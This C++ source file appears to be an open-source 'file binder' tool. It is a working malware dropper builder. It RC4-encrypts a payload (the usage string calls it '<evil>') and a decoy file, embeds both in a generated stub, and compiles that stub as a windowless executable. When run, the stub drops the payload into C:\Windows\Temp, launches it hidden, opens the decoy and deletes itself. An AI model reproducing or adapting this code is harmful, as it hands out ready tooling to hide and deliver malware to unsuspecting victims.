#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cstdlib>
#include <cstdio>
#include <Windows.h>
#include <string>
#include "base64.h"

using namespace std;

static const char* banner = R"(
   ______                  ________  _   __         ______    _                 __                
 .' ___  |                |_   __  |(_) [  |       |_   _ \  (_)               |  ]               
/ .'   \_|_ .--.   _ .--.   | |_ \_|__   | | .---.   | |_) | __   _ .--.   .--.| | .---.  _ .--.  
| |      [ '/'`\ \[ '/'`\ \ |  _|  [  |  | |/ /__\\  |  __'.[  | [ `.-. |/ /'`\' |/ /__\\[ `/'`\] 
\ `.___.'\| \__/ | | \__/ |_| |_    | |  | || \__., _| |__) || |  | | | || \__/  || \__., | |     
 `.____ .'| ;.__/  | ;.__/|_____|  [___][___]'.__.'|_______/[___][___||__]'.__.;__]'.__.'[___]    
         [__|     [__|                                                                            

    A simple file binder implemented in c++ !             
                                                                      Author:XiaoYaoJ
                                                                      Github:https://github.com/xiaoyaoxianj
)";

size_t length1,length2;

typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} _data, _key;

struct DataWithLength {
    unsigned char const* dataPtr;
    size_t length;
};

_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");
//RC4 

string splitBase64String(const string& inputString, int charactersPerLine) {
    string result;
    int length = inputString.length();
    int startPos = 0;

    while (startPos < length) {
        int len = min(charactersPerLine, length - startPos);
        string line = inputString.substr(startPos, len);
        result += "\"" + line + "\"\n";
        startPos += len;
    }

 
    if (!result.empty()) {
        result.pop_back();
    }
    return result;
}


DataWithLength RC4_fun(PUCHAR file, DWORD FileSize, PUCHAR keyBuffer, DWORD keySize) {
    _key.Buffer = keyBuffer;
    _key.Length = keySize;

    _data.Buffer = file;
    _data.Length = FileSize;
    
    SystemFunction033(&_data, &_key);

    return { _data.Buffer, _data.Length };
}

unsigned char* stringToPUCHAR(const std::string& str,size_t length) {
    const unsigned char* ucharPtr = reinterpret_cast<const unsigned char*>(str.c_str());
    unsigned char* buffer = new unsigned char[length + 1];
    for (size_t i = 0; i < length; ++i) {
        buffer[i] = str[i];
    }
    buffer[length] = '\0';

    return buffer;
    
}

unsigned char* readFile(const string& filename, size_t& length) {
    ifstream file(filename, ios::binary);
    if (!file) {
        cerr << "Failed to open file: " << filename << endl;
        exit(EXIT_FAILURE);
    }

    ostringstream oss;
    oss << file.rdbuf();
    string content = oss.str();
    length = content.length();
    unsigned char* buffer = stringToPUCHAR(content, length);

    return buffer;
}

std::string replaceSubstring(const std::string& str, const std::string& substr, const std::string& replacement) {
    std::string result = str;
    size_t pos = result.find(substr);
    if (pos != std::string::npos) {
        result.replace(pos, substr.length(), replacement);
    }
    return result;
}

void compileAndRun(const string& sourceCodeFilename, const string& outputFilename) {
    string compileCommand = "x86_64-w64-mingw32-g++  " + sourceCodeFilename + " -s -w -static -fpermissive -mwindows -o" + outputFilename;
    if (system(compileCommand.c_str()) != 0) {
        cerr << "Compilation failed." << endl;
        exit(EXIT_FAILURE);
    }
    else {
        cout << "Compile successfully" << endl;
    }
}

bool writeStringToFile(const string& filename, const string& data) {
    ofstream outfile(filename);
    if (!outfile.is_open()) {
        cerr << "Error: Unable to open file." << endl;
        return false;
    }
    outfile << data;
    outfile.close();
    cout << "String has been written to the file." << endl;
    return true;
}

string codeTemplate = R"(
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>


using namespace std;

string file1_bs64 = %file1base64%;
string file2_bs64 = %file2base64%;

string file_name1 = "%filename1%";
string file_name2 = "%filename2%";

string key = "%key%";

static const string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");

struct DataWithLength {
    unsigned char const* dataPtr;
    size_t length;
};



struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} _data, _key;

DataWithLength RC4_fun(PUCHAR file, DWORD FileSize, PUCHAR keyBuffer, DWORD keySize) {
    _key.Buffer = keyBuffer;
    _key.Length = keySize;

    _data.Buffer = file;
    _data.Length = FileSize;

    SystemFunction033(&_data, &_key);

    return { _data.Buffer, _data.Length };
}

unsigned char* stringToPUCHAR(const std::string& str, size_t length) {
    const unsigned char* ucharPtr = reinterpret_cast<const unsigned char*>(str.c_str());
    unsigned char* buffer = new unsigned char[length + 1];
    for (size_t i = 0; i < length; ++i) {
        buffer[i] = str[i];
    }
    buffer[length] = '\0';

    return buffer;

}

static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

string base64_decode(string const& encoded_string) {
    size_t in_len = encoded_string.size(); 
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    string ret;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]) & 0xff;

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = 0; j < i; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]) & 0xff;

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }

    return ret;
}

bool writeDataToFile(const std::string& filename, const unsigned char* data, size_t dataSize) {
    std::ofstream outfile(filename, std::ios::binary);
    if (!outfile) {
        std::cerr << "Failed to open file for writing.\n";
        return false;
    }

    outfile.write(reinterpret_cast<const char*>(data), dataSize);
    outfile.close();

    std::cout << "Decrypted data has been written to file: " << filename << std::endl;
    return true;
}


int main() {

    string file_a = base64_decode(file1_bs64);
    string file_b = base64_decode(file2_bs64);
    
    size_t length1 = file_a.length();
    size_t length2 = file_b.length();
    size_t key_len = sizeof _key;
   
    unsigned char* data1 = stringToPUCHAR(file_a, length1);
    unsigned char* data2 = stringToPUCHAR(file_b, length2);
    unsigned char* keyArray = stringToPUCHAR(key, key_len);

    DataWithLength encryptedDat1 = RC4_fun(data1,length1, (PUCHAR)keyArray, key_len);
    DataWithLength encryptedDat2 = RC4_fun(data2,length2, (PUCHAR)keyArray, key_len);
    
    string command = "cmd /k start " + file_name2;
    string delSelf = "/c del " + file_name2 + ".exe";
    string tempFolder = "C:\\Windows\\Temp\\";
    file_name1 = tempFolder + file_name1;  

    writeDataToFile(file_name1, encryptedDat1.dataPtr, encryptedDat1.length);
    writeDataToFile(file_name2, encryptedDat2.dataPtr, encryptedDat2.length);

    WinExec(command.c_str(), SW_HIDE);
    ShellExecuteA(0, "open", file_name1.c_str(),NULL, NULL, SW_HIDE);
    ShellExecuteA(0, "open", "cmd.exe",delSelf.c_str(), NULL, SW_HIDE);

    return 0;
}

)";

void generateSourceCode(const string& file1, const string& file2,const string& key) {

    base64 b64 = base64();
    int key_len = sizeof _key;
    unsigned char* keyArray = stringToPUCHAR(key, key_len);
  
    unsigned char* fileContents1 = readFile(file1,length1);  
    unsigned char* fileContents2 = readFile(file2,length2);
    DataWithLength encryptedData1 =  RC4_fun(fileContents1, length1, (PUCHAR)keyArray, key_len);
    DataWithLength encryptedData2 = RC4_fun(fileContents2, length2, (PUCHAR)keyArray, key_len);
    string file1_bs64 = b64.base64_encode(encryptedData1.dataPtr, encryptedData1.length);
    string file2_bs64 = b64.base64_encode(encryptedData2.dataPtr, encryptedData2.length);
    file1_bs64 = splitBase64String(file1_bs64, 64);
    file2_bs64 = splitBase64String(file2_bs64, 64);
   
    codeTemplate = replaceSubstring(codeTemplate, "%file1base64%", file1_bs64);
    codeTemplate = replaceSubstring(codeTemplate, "%file2base64%", file2_bs64);
    codeTemplate = replaceSubstring(codeTemplate, "%filename1%", file1);
    codeTemplate = replaceSubstring(codeTemplate, "%filename2%", file2);
    codeTemplate = replaceSubstring(codeTemplate, "%key%", key);

    writeStringToFile("kun.cpp", codeTemplate);
    compileAndRun("kun.cpp", file2+".exe");
  
    WinExec("cmd /c del kun.cpp", SW_HIDE);
     
}




int main(int argc, char* argv[]) {
    cout << banner << endl;
    if (argc != 4) {
        cerr << "Usage: " << argv[0] << " <evil> <file2> <Key>" << endl;
        return EXIT_FAILURE;
    }
    const string file1 = argv[1];
    const string file2 = argv[2];
    const string key = argv[3];
 
    generateSourceCode(file1, file2, key);
  
    return 0;
}
